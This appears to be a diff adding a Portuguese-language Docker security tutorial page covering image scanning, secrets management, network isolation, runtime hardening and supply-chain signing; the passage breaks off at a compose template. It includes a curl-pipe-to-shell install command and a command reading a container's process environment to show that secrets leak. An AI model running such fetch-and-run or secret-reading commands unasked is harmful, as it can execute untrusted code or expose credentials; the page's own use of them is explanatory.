+          </div>
+        </div>
+
+        <div class="topic-block">
+          <h3>Scan de Vulnerabilidades (CVEs)</h3>
+          <p>Escanear imagens é essencial para identificar vulnerabilidades conhecidas antes do deploy:</p>
+          <div class="command-grid">
+            <div class="command-card">
+              <div class="command-header"><code>Trivy — Scanner open source</code><span class="cmd-tag">Ferramenta</span></div>
+              <pre><code># TRIVY — Scanner de CVEs mais popular
+# ════════════════════════════════════════
+#
+# INSTALAR:
+# macOS:
+brew install trivy
+# Linux:
+curl -sfL https://raw.githubusercontent.com/\
+aquasecurity/trivy/main/contrib/install.sh \
+| sh -s -- -b /usr/local/bin
+
+# SCAN DE IMAGEM:
+trivy image nginx:alpine
+# Mostra todas as CVEs encontradas
+
+# SCAN COM SEVERIDADE MÍNIMA:
+trivy image --severity HIGH,CRITICAL \
+  minha-app:latest
+
+# SCAN DO DOCKERFILE:
+trivy config Dockerfile
+
+# SCAN COM FAIL (para CI/CD):
+trivy image --exit-code 1 \
+  --severity CRITICAL \
+  minha-app:latest
+# Exit code 1 se encontrar CRITICAL
+# → Falha o pipeline!
+
+# FORMATOS DE SAÍDA:
+trivy image -f json -o results.json \
+  minha-app:latest
+trivy image -f sarif -o results.sarif \
+  minha-app:latest
+
+# SCAN DO FILESYSTEM LOCAL:
+trivy fs --security-checks vuln,config .
+
+# IGNORAR CVEs ACEITAS:
+# .trivyignore:
+# CVE-2023-1234
+# CVE-2023-5678</code></pre>
+            </div>
+            <div class="command-card">
+              <div class="command-header"><code>Docker Scout — Integrado ao Docker</code><span class="cmd-tag">Ferramenta</span></div>
+              <pre><code># DOCKER SCOUT — Scanner oficial do Docker
+# ════════════════════════════════════════════
+#
+# JÁ VEM COM DOCKER DESKTOP
+# Não precisa instalar nada extra
+
+# SCAN RÁPIDO:
+docker scout quickview nginx:alpine
+
+# SCAN DETALHADO DE CVEs:
+docker scout cves nginx:alpine
+
+# COMPARAR DUAS IMAGENS:
+docker scout compare \
+  --to nginx:1.25-alpine \
+  nginx:1.24-alpine
+
+# RECOMENDAÇÕES DE UPGRADE:
+docker scout recommendations nginx:alpine
+# Sugere versões mais seguras!
+
+# NO DOCKER HUB:
+# Imagens no Hub já mostram CVEs
+# na aba "Vulnerabilities"
+
+# INTEGRAÇÃO COM CI/CD:
+# GitHub Actions:
+# - uses: docker/scout-action@v1
+#   with:
+#     command: cves
+#     image: minha-app:latest
+#     only-severities: critical,high
+
+# VANTAGEM DO SCOUT:
+# ✅ Integrado ao Docker CLI
+# ✅ Recomendações automáticas
+# ✅ Baseline comparisons
+# ✅ Policy compliance
+# ✅ SBOM automático</code></pre>
+            </div>
+          </div>
+          <div class="info-box highlight">
+            <strong>🔑 Regra para CI/CD:</strong> Sempre inclua scan de vulnerabilidades no pipeline. Configure para <strong>falhar o build</strong> se houver CVEs de severidade CRITICAL. CVEs HIGH devem gerar alertas. Isso evita deploy de imagens vulneráveis em produção.
+          </div>
+        </div>
+
+        <div class="topic-block">
+          <h3>Pinning de Versão e Imagens Determinísticas</h3>
+          <p>Nunca use <code>:latest</code> em produção — pins de versão garantem builds reproduzíveis e seguros:</p>
+          <div class="command-grid">
+            <div class="command-card wide">
+              <div class="command-header"><code>Pinning de versão — Do errado ao correto</code><span class="cmd-tag">Boas Práticas</span></div>
+              <pre><code># ════════════════════════════════════════════════════════════════
+# NÍVEIS DE PINNING (menos → mais seguro)
+# ════════════════════════════════════════════════════════════════
+
+# ❌ NÍVEL 0: Sem tag (é o :latest implícito)
+FROM node
+# Problema: Pode mudar a qualquer momento
+
+# ⚠️ NÍVEL 1: Tag major
+FROM node:20
+# Problema: 20.10 → 20.11 pode quebrar algo
+
+# ✅ NÍVEL 2: Tag minor + variant
+FROM node:20.12-alpine
+# Bom: previsível, mas pode ter patch updates
+
+# ✅✅ NÍVEL 3: Digest (SHA256) — Máxima segurança
+FROM node:20.12-alpine@sha256:abc123def456...
+# Perfeito: EXATAMENTE esta imagem, nunca muda
+
+# COMO ENCONTRAR O DIGEST:
+docker inspect --format='{{index .RepoDigests 0}}' node:20-alpine
+# node@sha256:a1b2c3d4e5...
+
+docker pull node:20-alpine --quiet
+# Mostra o digest no pull
+
+# PINNING EM PACKAGE MANAGERS DENTRO DO DOCKERFILE:
+# ════════════════════════════════════════════════════════════════
+
+# ❌ Ruim: versão flutuante
+RUN apt-get install -y curl
+
+# ✅ Bom: versão pinada
+RUN apt-get install -y curl=7.88.1-10+deb12u5
+
+# ❌ Ruim: sem lock file
+RUN pip install flask requests
+
+# ✅ Bom: com hash verification
+RUN pip install --require-hashes -r requirements.txt
+
+# POLÍTICA RECOMENDADA:
+# • Produção: SEMPRE pin com digest ou tag exata
+# • Desenvolvimento: tag minor (ex: node:20-alpine)
+# • CI/CD: tag exata + scan de CVE antes do deploy</code></pre>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+
+    <!-- ============================================================ -->
+    <!-- SEÇÃO 4: SECRETS MANAGEMENT -->
+    <!-- ============================================================ -->
+    <section class="module-section alt-bg">
+      <div class="container">
+        <div class="module-header">
+          <span class="module-badge">Secrets</span>
+          <h2>Secrets Management</h2>
+          <p>Gerenciar segredos (senhas, tokens, chaves) é um dos maiores desafios em containers. Variáveis de ambiente NÃO são seguras para secrets sensíveis. Aprenda as alternativas corretas.</p>
+        </div>
+
+        <div class="topic-block">
+          <h3>Por que ENV Vars NÃO São Seguras para Secrets</h3>
+          <p>Muitos tutoriais ensinam a passar secrets via variáveis de ambiente. Isso tem problemas sérios:</p>
+          <div class="command-grid">
+            <div class="command-card wide">
+              <div class="command-header"><code>Problemas com ENV para secrets</code><span class="cmd-tag">Risco</span></div>
+              <pre><code># POR QUE VARIÁVEIS DE AMBIENTE NÃO SÃO SEGURAS:
+# ════════════════════════════════════════════════════════════════
+
+# 1. VISÍVEIS NO docker inspect:
+docker inspect container_name | grep -A5 "Env"
+# → Mostra TODOS os env vars, incluindo senhas!
+
+# 2. VISÍVEIS NO /proc:
+docker exec container cat /proc/1/environ
+# → Qualquer processo no container pode ler
+
+# 3. FICAM NOS LOGS:
+# Se a app faz log das variáveis de ambiente,
+# as senhas vão para o log!
+
+# 4. HERDADAS POR PROCESSOS FILHOS:
+# Qualquer subprocesso recebe TODAS as env vars
+# → Bibliotecas maliciosas podem ler
+
+# 5. FICAM NO HISTÓRICO:
+docker run -e PASSWORD=super_secret ...
+# → Visível no history do shell!
+
+# 6. FICAM NA IMAGEM (se usar ENV no Dockerfile):
+# ❌ NUNCA faça isso:
+ENV DATABASE_PASSWORD=minha_senha
+# → A senha fica em TODAS as camadas!
+# → docker history mostra!
+
+# QUANDO ENV É ACEITÁVEL:
+# ✅ Configurações não-sensíveis (NODE_ENV, PORT)
+# ✅ URLs públicas (API endpoints)
+# ✅ Feature flags
+#
+# QUANDO NÃO USAR ENV:
+# ❌ Senhas de banco
+# ❌ API keys privadas
+# ❌ Tokens de autenticação
+# ❌ Chaves de criptografia
+# ❌ Certificados TLS</code></pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="topic-block">
+          <h3>Docker Secrets (Swarm e Compose)</h3>
+          <p>Docker Secrets monta o segredo como arquivo em <code>/run/secrets/</code> — mais seguro que env vars:</p>
+          <div class="command-grid">
+            <div class="command-card">
+              <div class="command-header"><code>Docker Secrets no Compose</code><span class="cmd-tag">Compose</span></div>
+              <pre><code># docker-compose.yml com Secrets
+# ════════════════════════════════════════
+services:
+  api:
+    image: minha-api:latest
+    secrets:
+      - db_password
+      - api_key
+    environment:
+      # Referência ao arquivo de secret:
+      DB_PASSWORD_FILE: /run/secrets/db_password
+      API_KEY_FILE: /run/secrets/api_key
+
+  db:
+    image: postgres:16-alpine
+    secrets:
+      - db_password
+    environment:
+      # Postgres suporta _FILE nativamente!
+      POSTGRES_PASSWORD_FILE: /run/secrets/db_password
+
+# Definição dos secrets:
+secrets:
+  db_password:
+    file: ./secrets/db_password.txt
+  api_key:
+    file: ./secrets/api_key.txt
+
+# O ARQUIVO DE SECRET:
+# ./secrets/db_password.txt contém APENAS:
+# minha_senha_super_segura
+# (sem newline no final!)
+
+# DENTRO DO CONTAINER:
+# /run/secrets/db_password → montado como
+# arquivo read-only em tmpfs (RAM)</code></pre>
+            </div>
+            <div class="command-card">
+              <div class="command-header"><code>Ler secrets no código</code><span class="cmd-tag">App Code</span></div>
+              <pre><code># LENDO SECRETS NA APLICAÇÃO:
+# ════════════════════════════════════════
+
+# PYTHON:
+import os
+
+def get_secret(name):
+    """Lê secret de arquivo ou env var."""
+    # Tentar ler do arquivo primeiro
+    file_path = f"/run/secrets/{name}"
+    if os.path.exists(file_path):
+        with open(file_path, 'r') as f:
+            return f.read().strip()
+    # Fallback para env var (dev)
+    return os.environ.get(name.upper())
+
+db_password = get_secret("db_password")
+
+# NODE.JS:
+const fs = require('fs');
+const path = require('path');
+
+function getSecret(name) {
+  const filePath = `/run/secrets/${name}`;
+  try {
+    return fs.readFileSync(filePath, 'utf8')
+             .trim();
+  } catch {
+    return process.env[name.toUpperCase()];
+  }
+}
+
+const dbPassword = getSecret('db_password');
+
+# PADRÃO _FILE (como o PostgreSQL faz):
+# A app verifica se existe DB_PASSWORD_FILE
+# Se sim, lê o conteúdo do arquivo
+# Se não, usa DB_PASSWORD (env var, p/ dev)</code></pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="topic-block">
+          <h3>Integração com HashiCorp Vault</h3>
+          <p>Para ambientes enterprise, use um gerenciador de secrets dedicado como HashiCorp Vault:</p>
+          <div class="command-grid">
+            <div class="command-card wide">
+              <div class="command-header"><code>Vault + Docker — Arquitetura</code><span class="cmd-tag">Enterprise</span></div>
+              <pre><code># HASHICORP VAULT + DOCKER
+# ════════════════════════════════════════════════════════════════
+#
+# ARQUITETURA:
+# ┌──────────────┐     ┌──────────────┐
+# │  Container   │────▶│  Vault       │
+# │  (app)       │     │  Server      │
+# └──────────────┘     └──────────────┘
+#   1. Autentica         2. Retorna secret
+#   (token/role)         (temporário, rotaciona)
+#
+# VANTAGENS DO VAULT:
+# ✅ Secrets dinâmicos (credenciais temporárias)
+# ✅ Rotação automática
+# ✅ Audit log completo
+# ✅ Controle de acesso (policies)
+# ✅ Integração com K8s, AWS, GCP, Azure
+#
+# EXEMPLO COM DOCKER COMPOSE:
+services:
+  vault:
+    image: hashicorp/vault:1.15
+    cap_add:
+      - IPC_LOCK
+    ports:
+      - "8200:8200"
+    environment:
+      VAULT_DEV_ROOT_TOKEN_ID: dev-token
+
+  app:
+    image: minha-app
+    environment:
+      VAULT_ADDR: http://vault:8200
+      VAULT_TOKEN: dev-token  # Apenas para dev!
+    depends_on:
+      - vault
+
+# EM PRODUÇÃO, USE:
+# • AppRole authentication
+# • Kubernetes auth method
+# • AWS IAM auth method
+# • Tokens curtos (TTL 1h)
+# • Policies restritivas
+
+# ALTERNATIVAS AO VAULT:
+# • AWS Secrets Manager
+# • Azure Key Vault
+# • GCP Secret Manager
+# • CyberArk
+# • Doppler</code></pre>
+            </div>
+          </div>
+          <div class="info-box">
+            <strong>💡 Resumo de opções:</strong> Para projetos pequenos use Docker Secrets (arquivo). Para projetos médios use variáveis de ambiente via CI/CD (GitHub Secrets → env vars injetadas no runtime). Para enterprise use Vault ou o secrets manager da sua cloud.
+          </div>
+        </div>
+      </div>
+    </section>
+
+
+    <!-- ============================================================ -->
+    <!-- SEÇÃO 5: NETWORK SECURITY -->
+    <!-- ============================================================ -->
+    <section class="module-section">
+      <div class="container">
+        <div class="module-header">
+          <span class="module-badge">Network</span>
+          <h2>Network Security</h2>
+          <p>A rede é um vetor de ataque frequente. Containers não devem ter acesso à rede sem necessidade, portas não devem ser expostas desnecessariamente, e a comunicação entre services deve ser criptografada quando possível.</p>
+        </div>
+
+        <div class="topic-block">
+          <h3>Princípio: Mínimo Acesso à Rede</h3>
+          <p>Por padrão, todos os containers em uma rede Docker podem se comunicar entre si. Isso viola o princípio de mínimo privilégio:</p>
+          <div class="command-grid">
+            <div class="command-card">
+              <div class="command-header"><code>Redes internas e isolamento</code><span class="cmd-tag">Isolamento</span></div>
+              <pre><code># REDE INTERNA (sem acesso à internet)
+# ════════════════════════════════════════
+#
+# Por padrão, containers acessam internet.
+# Para serviços que NÃO precisam (DB, cache):
+
+# docker-compose.yml
+services:
+  db:
+    image: postgres:16-alpine
+    networks:
+      - backend    # Somente rede interna
+
+  redis:
+    image: redis:7-alpine
+    networks:
+      - backend    # Somente rede interna
+
+  api:
+    image: minha-api
+    networks:
+      - frontend   # Acessa internet
+      - backend    # Acessa DB e Redis
+
+  nginx:
+    image: nginx:alpine
+    ports:
+      - "443:443"  # Única porta exposta!
+    networks:
+      - frontend   # Somente frontend
+
+networks:
+  frontend:
+    driver: bridge
+  backend:
+    driver: bridge
+    internal: true  # ← SEM acesso à internet!
+
+# RESULTADO:
+# ✅ DB e Redis sem internet (impossível exfiltrar)
+# ✅ API acessa ambas as redes
+# ✅ Nginx é o único com porta exposta
+# ✅ Atacante que compromete DB fica preso</code></pre>
+            </div>
+            <div class="command-card">
+              <div class="command-header"><code>Portas: bind em localhost</code><span class="cmd-tag">Exposição</span></div>
+              <pre><code># NÃO EXPOR PORTAS DESNECESSÁRIAS
+# ════════════════════════════════════════
+
+# ❌ ERRADO: Expõe em TODAS as interfaces
+ports:
+  - "5432:5432"    # Acessível de QUALQUER IP!
+  - "6379:6379"    # Redis aberto para o mundo!
+
+# ✅ CORRETO: Bind em localhost apenas
+ports:
+  - "127.0.0.1:5432:5432"  # Só localhost
+  - "127.0.0.1:6379:6379"  # Só localhost
+
+# ✅ MELHOR: Não expor porta nenhuma!
+# Se o DB só é acessado por outros containers
+# na mesma rede, NÃO precisa de ports:
+services:
+  db:
+    image: postgres:16-alpine
+    # Sem "ports:" — acesso apenas via rede interna
+    networks:
+      - backend
+
+# VERIFICAR PORTAS EXPOSTAS:
+docker ps --format "{{.Ports}}"
+# 0.0.0.0:5432->5432/tcp  ← PERIGO!
+# 127.0.0.1:5432->5432/tcp ← OK
+
+# VERIFICAR DO HOST:
+ss -tlnp | grep docker
+netstat -tlnp | grep docker
+
+# REGRA:
+# Apenas o reverse proxy (nginx/traefik)
+# deve ter portas expostas para 0.0.0.0
+# Todo o resto: rede interna ou localhost</code></pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="topic-block">
+          <h3>TLS entre Containers</h3>
+          <p>Para ambientes de alta segurança, criptografe a comunicação mesmo entre containers na mesma rede:</p>
+          <div class="command-grid">
+            <div class="command-card wide">
+              <div class="command-header"><code>Mutual TLS (mTLS) entre containers</code><span class="cmd-tag">Criptografia</span></div>
+              <pre><code># TLS ENTRE CONTAINERS — QUANDO USAR
+# ════════════════════════════════════════════════════════════════
+#
+# QUANDO É NECESSÁRIO:
+# • Compliance (PCI-DSS, HIPAA, SOC2)
+# • Multi-host (containers em hosts diferentes)
+# • Zero-trust architecture
+# • Dados altamente sensíveis (financeiro, saúde)
+#
+# QUANDO NÃO É NECESSÁRIO:
+# • Single-host com redes isoladas (Docker bridge)
+# • Desenvolvimento local
+# • Ambientes não-produção
+
+# OPÇÃO 1: TLS com certificados gerenciados pelo app
+services:
+  api:
+    image: minha-api
+    volumes:
+      - ./certs/api:/app/certs:ro
+    environment:
+      TLS_CERT: /app/certs/cert.pem
+      TLS_KEY: /app/certs/key.pem
+      DB_SSL_CA: /app/certs/ca.pem
+
+  db:
+    image: postgres:16-alpine
+    volumes:
+      - ./certs/db:/var/lib/postgresql/certs:ro
+    command: >
+      -c ssl=on
+      -c ssl_cert_file=/var/lib/postgresql/certs/server.crt
+      -c ssl_key_file=/var/lib/postgresql/certs/server.key
+
+# OPÇÃO 2: Service mesh (Linkerd, Istio)
+# → Injeta sidecar proxy com mTLS automático
+# → Melhor para Kubernetes, overkill para Docker standalone
+
+# OPÇÃO 3: Docker Swarm com encrypt
+docker network create --opt encrypted --driver overlay secure-net
+# → Criptografa tráfego automaticamente na overlay network</code></pre>
+            </div>
+          </div>
+          <div class="info-box">
+            <strong>💡 Regra prática:</strong> Em Docker single-host com redes internas (<code>internal: true</code>), TLS entre containers geralmente é overkill. O tráfego já está isolado no bridge virtual. TLS é essencial quando containers estão em hosts diferentes ou quando compliance exige.
+          </div>
+        </div>
+      </div>
+    </section>
+
+
+    <!-- ============================================================ -->
+    <!-- SEÇÃO 6: RUNTIME SECURITY -->
+    <!-- ============================================================ -->
+    <section class="module-section alt-bg">
+      <div class="container">
+        <div class="module-header">
+          <span class="module-badge">Runtime</span>
+          <h2>Runtime Security</h2>
+          <p>Além de construir imagens seguras e configurar redes, é fundamental aplicar controles de segurança no momento da execução do container. Isso limita o que um atacante pode fazer mesmo que comprometa a aplicação.</p>
+        </div>
+
+        <div class="topic-block">
+          <h3>Read-Only Filesystem</h3>
+          <p>Containers não precisam escrever no filesystem na maioria dos casos. Um filesystem read-only impede que atacantes plantem malware:</p>
+          <div class="command-grid">
+            <div class="command-card">
+              <div class="command-header"><code>Read-Only com tmpfs para temp</code><span class="cmd-tag">Hardening</span></div>
+              <pre><code># READ-ONLY FILESYSTEM
+# ════════════════════════════════════════
+
+# Docker run:
+docker run --read-only \
+  --tmpfs /tmp:rw,noexec,nosuid \
+  --tmpfs /var/run:rw,noexec,nosuid \
+  minha-app
+
+# Docker Compose:
+services:
+  api:
+    image: minha-api
+    read_only: true
+    tmpfs:
+      - /tmp:rw,noexec,nosuid,size=64m
+      - /var/run:rw,noexec,nosuid
+      - /var/cache/nginx:rw,noexec,nosuid
+    volumes:
+      # Apenas onde PRECISA escrever:
+      - app-logs:/app/logs
+
+# POR QUE FUNCIONA:
+# ✅ Atacante não pode instalar ferramentas
+# ✅ Não pode modificar binários da app
+# ✅ Não pode criar scripts maliciosos
+# ✅ Não pode plantar backdoors
+#
+# TMPFS FLAGS:
+# noexec → Não pode executar binários
+# nosuid → Não pode setuid
+# size=64m → Limita tamanho
+
+# DICA: Teste assim:
+docker exec container touch /test
+# touch: cannot touch '/test': Read-only
+# file system  ← Funcionou!</code></pre>
+            </div>
+            <div class="command-card">
+              <div class="command-header"><code>Seccomp — Filtro de syscalls</code><span class="cmd-tag">Kernel</span></div>
+              <pre><code># SECCOMP — FILTRAGEM DE SYSTEM CALLS
+# ════════════════════════════════════════
+#
+# O QUE É:
+# Seccomp filtra quais syscalls o container
+# pode fazer ao kernel. Docker já aplica um
+# perfil padrão que bloqueia ~44 syscalls.
+#
+# PERFIL PADRÃO DO DOCKER BLOQUEIA:
+# • reboot, kexec_load (reiniciar host)
+# • mount, umount (montar filesystems)
+# • ptrace (debug de outros processos)
+# • keyctl (manipular chaves do kernel)
+# • bpf (Berkeley Packet Filter)
+# • clock_settime (mudar hora do host)
+
+# VERIFICAR PERFIL ATUAL:
+docker inspect --format \
+  '{{.HostConfig.SecurityOpt}}' container
+
+# USAR PERFIL CUSTOMIZADO:
+docker run --security-opt \
+  seccomp=custom-profile.json \
+  minha-app
+
+# NO COMPOSE:
+services:
+  app:
+    security_opt:
+      - seccomp:./seccomp-profile.json
+
+# PERFIL MAIS RESTRITIVO:
+# Bloqueia TUDO e permite apenas o necessário
+# (Precisa testar com a aplicação)
+
+# ⚠️ NUNCA DESABILITAR SECCOMP:
+# --security-opt seccomp=unconfined
+# → Remove TODA proteção de syscalls!
+# → Apenas para debug em dev!</code></pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="topic-block">
+          <h3>AppArmor e no-new-privileges</h3>
+          <p>Camadas adicionais de segurança no nível do kernel Linux:</p>
+          <div class="command-grid">
+            <div class="command-card wide">
+              <div class="command-header"><code>AppArmor + no-new-privileges</code><span class="cmd-tag">Mandatory Access</span></div>
+              <pre><code># APPARMOR — Mandatory Access Control
+# ════════════════════════════════════════════════════════════════
+#
+# O QUE É:
+# AppArmor restringe o que programas podem acessar no filesystem,
+# rede e capabilities — mesmo que rodem como root dentro do container.
+#
+# Docker aplica perfil padrão: docker-default
+# Ele restringe:
+# • Acesso a /proc/sys/** (write)
+# • Montagem de filesystems
+# • Acesso a /sys/**
+# • ptrace de outros containers
+
+# VERIFICAR PERFIL APPARMOR:
+docker inspect --format='{{.AppArmorProfile}}' container
+# docker-default
+
+# USAR PERFIL CUSTOMIZADO:
+docker run --security-opt apparmor=meu-perfil minha-app
+
+# NO COMPOSE:
+services:
+  app:
+    security_opt:
+      - apparmor:docker-custom
+
+# ════════════════════════════════════════════════════════════════
+# NO-NEW-PRIVILEGES — Impedir escalação
+# ════════════════════════════════════════════════════════════════
+#
+# O QUE FAZ:
+# Impede que processos dentro do container ganhem MORE
+# privileges do que o processo pai. Bloqueia:
+# • setuid binaries
+# • setgid binaries
+# • Escalação via capabilities
+
+# Docker run:
+docker run --security-opt=no-new-privileges:true minha-app
+
+# Docker Compose:
+services:
+  app:
+    security_opt:
+      - no-new-privileges:true
+
+# COMBINAÇÃO IDEAL PARA PRODUÇÃO:
+services:
+  api:
+    image: minha-api
+    read_only: true
+    user: "1000:1000"
+    cap_drop:
+      - ALL
+    security_opt:
+      - no-new-privileges:true
+      - seccomp:./seccomp-custom.json
+    tmpfs:
+      - /tmp:rw,noexec,nosuid,size=64m
+
+# RESULTADO: Container extremamente restrito
+# ✅ Non-root
+# ✅ Sem capabilities
+# ✅ Sem escalação possível
+# ✅ Filesystem read-only
+# ✅ Syscalls filtradas
+# ✅ Temp sem execução de binários</code></pre>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+
+    <!-- ============================================================ -->
+    <!-- SEÇÃO 7: SUPPLY CHAIN SECURITY -->
+    <!-- ============================================================ -->
+    <section class="module-section">
+      <div class="container">
+        <div class="module-header">
+          <span class="module-badge">Supply Chain</span>
+          <h2>Supply Chain Security</h2>
+          <p>A cadeia de suprimentos de imagens Docker é um vetor de ataque crescente. Você precisa garantir que as imagens que consome e produz são autênticas, íntegras e rastreáveis.</p>
+        </div>
+
+        <div class="topic-block">
+          <h3>Docker Content Trust (DCT)</h3>
+          <p>Docker Content Trust garante que imagens baixadas são assinadas pelo publisher e não foram alteradas:</p>
+          <div class="command-grid">
+            <div class="command-card">
+              <div class="command-header"><code>Content Trust — Verificação de assinatura</code><span class="cmd-tag">Integridade</span></div>
+              <pre><code># DOCKER CONTENT TRUST (DCT)
+# ════════════════════════════════════════
+#
+# O QUE FAZ:
+# Garante que imagens puxadas do registry
+# foram assinadas pelo publisher e não
+# foram modificadas em trânsito.
+#
+# HABILITAR:
+export DOCKER_CONTENT_TRUST=1
+
+# A PARTIR DAQUI:
+# • docker pull só baixa imagens assinadas
+# • docker push assina automaticamente
+# • Imagens não-assinadas são REJEITADAS
+
+# TESTE:
+docker pull nginx:alpine
+# → Funciona (nginx é assinada)
+
+docker pull random-user/app:latest
+# → FALHA se não for assinada!
+
+# DESABILITAR TEMPORARIAMENTE:
+DOCKER_CONTENT_TRUST=0 docker pull ...
+
+# ASSINAR SUAS IMAGENS:
+# Na primeira vez, Docker gera chaves:
+# • Root key (offline, backup seguro!)
+# • Repository key (por imagem)
+# • Delegations (por colaborador)
+
+docker push minha-org/minha-app:v1.0
+# → Assina com sua chave
+# → Grava assinatura no Notary server
+
+# VERIFICAR ASSINATURA:
+docker trust inspect minha-org/minha-app
+# Mostra quem assinou e quando</code></pre>
+            </div>
+            <div class="command-card">
+              <div class="command-header"><code>SBOM — Software Bill of Materials</code><span class="cmd-tag">Rastreabilidade</span></div>
+              <pre><code># SBOM — LISTA DE COMPONENTES
+# ════════════════════════════════════════
+#
+# O QUE É:
+# Uma "lista de ingredientes" da imagem.
+# Documenta TODOS os pacotes, libs e
+# dependências incluídas na imagem.
+#
+# POR QUE IMPORTA:
+# • Saber se você é afetado por uma CVE
+# • Compliance (regulatório)
+# • Auditoria de segurança
+# • Rastreabilidade de componentes
+
+# GERAR SBOM COM DOCKER:
+docker sbom nginx:alpine
+# Lista todos os pacotes da imagem
+
+# GERAR SBOM COM TRIVY:
+trivy image --format spdx-json \
+  -o sbom.json minha-app:latest
+
+# GERAR SBOM COM SYFT:
+syft minha-app:latest -o spdx-json
+syft minha-app:latest -o cyclonedx-json
+
+# FORMATOS PADRÃO:
+# • SPDX (Linux Foundation)
+# • CycloneDX (OWASP)
+# Ambos são JSON/XML padronizados
+
+# INTEGRAR NO CI/CD:
+# 1. Build da imagem
+# 2. Gera SBOM
+# 3. Armazena SBOM junto da imagem
+# 4. Scan da SBOM por CVEs
+# 5. Se novo CVE descoberto depois,
+#    consulta SBOM para saber se afetado
+
+# ATTESTATION (Docker Buildx):
+docker buildx build \
+  --sbom=true \
+  --provenance=true \
+  -t minha-app:v1.0 .</code></pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="topic-block">
+          <h3>Verificação e Procedência de Imagens</h3>
+          <div class="command-grid">
+            <div class="command-card wide">
+              <div class="command-header"><code>Provenance e verificação completa</code><span class="cmd-tag">Completo</span></div>
+              <pre><code># SUPPLY CHAIN SECURITY — CHECKLIST COMPLETO
+# ════════════════════════════════════════════════════════════════
+
+# 1. USAR APENAS IMAGENS OFICIAIS OU VERIFICADAS:
+# ✅ Docker Official Images (selo azul no Hub)
+# ✅ Docker Verified Publisher
+# ✅ Imagens internas do seu registry privado
+# ❌ Imagens random sem verificação
+
+# 2. REGISTRY PRIVADO (controle total):
+# Opções:
+# • Harbor (open source, com scan e policies)
+# • Docker Hub (plano Team/Business)
+# • AWS ECR / GCP Artifact Registry / Azure ACR
+# • GitHub Container Registry (ghcr.io)
+
+# 3. PROVENANCE — De onde veio o build?
+# Docker Buildx pode gerar attestation de provenance:
+docker buildx build \
+  --provenance=true \
+  --push \
+  -t myregistry/app:v1.0 .
+# → Registra: quem construiu, quando, de qual commit
+
+# VERIFICAR PROVENANCE:
+docker buildx imagetools inspect \
+  myregistry/app:v1.0 \
+  --format "{{json .Provenance}}"
+
+# 4. POLICY ENFORCEMENT:
+# Ferramentas que bloqueiam deploy de imagens não-aprovadas:
+# • OPA/Gatekeeper (Kubernetes)
+# • Docker Scout Policies
+# • Kyverno (Kubernetes)
+# • Sigstore/Cosign (assinatura de imagens)
+
+# 5. COSIGN — Assinatura moderna de imagens:
+# Instalar:
+brew install cosign
+# ou: go install github.com/sigstore/cosign/v2/cmd/cosign@latest
+
+# Gerar par de chaves:
+cosign generate-key-pair
+
+# Assinar imagem:
+cosign sign --key cosign.key myregistry/app:v1.0
+
+# Verificar imagem:
+cosign verify --key cosign.pub myregistry/app:v1.0
+
+# PIPELINE COMPLETO:
+# Build → Scan → SBOM → Sign → Push → Verify → Deploy</code></pre>
+            </div>
+          </div>
+          <div class="info-box highlight">
+            <strong>🔑 Pipeline de segurança ideal:</strong> Build imagem → Scan de CVEs (Trivy) → Gerar SBOM → Assinar (Cosign/DCT) → Push para registry privado → Verificar assinatura no deploy → Monitorar em runtime.
+          </div>
+        </div>
+      </div>
+    </section>
+
+
+    <!-- ============================================================ -->
+    <!-- SEÇÃO 8: CHECKLIST DE SEGURANÇA PARA PRODUÇÃO -->
+    <!-- ============================================================ -->
+    <section class="module-section alt-bg">
+      <div class="container">
+        <div class="module-header">
+          <span class="module-badge">Checklist</span>
+          <h2>Checklist de Segurança para Produção</h2>
+          <p>Antes de colocar containers em produção, valide cada item desta lista. Cada controle é uma camada adicional de defesa que reduz significativamente a superfície de ataque.</p>
+        </div>
+
+        <div class="topic-block">
+          <h3>Top 10 Práticas de Segurança</h3>
+          <div class="checklist-grid">
+            <div class="checklist-card">
+              <h4>1. Non-Root</h4>
+              <p>Containers NUNCA rodam como root. Use <code>USER</code> no Dockerfile com UID > 1000. Valide com <code>docker exec container whoami</code>.</p>
+            </div>
+            <div class="checklist-card">
+              <h4>2. Imagem Mínima</h4>
+              <p>Use Alpine, Distroless ou Scratch. Remova pacotes desnecessários. Quanto menor a imagem, menor a superfície de ataque.</p>
+            </div>
+            <div class="checklist-card">
+              <h4>3. Scan de CVEs</h4>
+              <p>Execute Trivy ou Docker Scout no CI/CD. Falhe o build em CVEs CRITICAL. Monitore novas CVEs continuamente.</p>
+            </div>
+            <div class="checklist-card">
+              <h4>4. Secrets Seguros</h4>
+              <p>NUNCA use ENV para senhas. Use Docker Secrets, Vault, ou o secrets manager da sua cloud. Rotacione periodicamente.</p>
+            </div>
+            <div class="checklist-card">
+              <h4>5. Read-Only FS</h4>
+              <p>Use <code>read_only: true</code> com tmpfs apenas onde necessário. Impede instalação de malware e modificação de binários.</p>
+            </div>
+            <div class="checklist-card">
+              <h4>6. Drop ALL Caps</h4>
+              <p>Use <code>cap_drop: ALL</code> e adicione apenas as capabilities específicas necessárias. Nunca dê SYS_ADMIN.</p>
+            </div>
+            <div class="checklist-card">
+              <h4>7. Rede Isolada</h4>
+              <p>Use <code>internal: true</code> para serviços que não precisam de internet. Exponha apenas as portas estritamente necessárias.</p>
+            </div>
+            <div class="checklist-card">
+              <h4>8. No-New-Privileges</h4>
+              <p>Sempre use <code>no-new-privileges:true</code>. Impede escalação via setuid/setgid binaries dentro do container.</p>
+            </div>
+            <div class="checklist-card">
+              <h4>9. Pin de Versão</h4>
+              <p>Use tags exatas ou digests SHA256 para todas as imagens base. Nunca use <code>:latest</code> em produção.</p>
+            </div>
+            <div class="checklist-card">
+              <h4>10. Content Trust</h4>
+              <p>Habilite Docker Content Trust ou use Cosign. Verifique assinaturas antes de deploy. Mantenha SBOM atualizado.</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="topic-block">
+          <h3>Docker Compose Seguro — Template Completo</h3>
+          <div class="command-grid">
+            <div class="command-card wide">
+              <div class="command-header"><code>docker-compose.yml — Segurança máxima</code><span class="cmd-tag">Template</span></div>
+              <pre><code># ════════════════════════════════════════════════════════════════
+# TEMPLATE: Docker Compose com TODAS as práticas de segurança
+# ════════════════════════════════════════════════════════════════
+
+services:
+  api:
